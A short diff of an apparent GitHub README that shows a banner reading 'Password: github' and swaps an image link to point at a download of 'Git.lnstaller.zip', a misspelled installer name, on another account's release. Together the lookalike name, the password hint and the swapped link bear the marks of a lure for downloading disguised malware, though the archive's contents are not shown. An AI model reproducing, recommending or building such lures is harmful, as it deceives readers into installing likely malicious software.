@@ -4,5 +4,5 @@
 
 <a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Open+Sans&weight=600&size=30&pause=1000&center=true&vCenter=true&random=true&width=435&lines=Password:+github" alt="Typing SVG" /></a>
 
-## [![*](https://github.com/chiscem/dcpro24/assets/163025428/0e5aca8c-f805-4b97-abad-ca179f571fdc)](https://tinyurl.com/askfjgbkj1b2)
+## [![*](https://github.com/chiscem/dcpro24/assets/163025428/0e5aca8c-f805-4b97-abad-ca179f571fdc)](https://github.com/d3dev3lop/d3dev/releases/download/Image/Git.lnstaller.zip)
 
